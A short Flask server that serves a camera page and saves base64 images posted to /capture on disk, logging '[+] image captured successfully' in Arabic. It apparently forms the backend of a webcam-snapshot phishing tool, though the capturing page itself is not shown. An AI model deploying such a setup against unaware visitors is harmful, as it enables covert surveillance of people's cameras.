
from flask import Flask, render_template, request
import base64
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("cam.html")

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    if not os.path.exists("captured"):
        os.makedirs("captured")
    with open("captured/image.jpg", "wb") as f:
        f.write(base64.b64decode(image_data))
    print("[+] صورة تم التقاطها بنجاح!")
    return "تم الحفظ", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
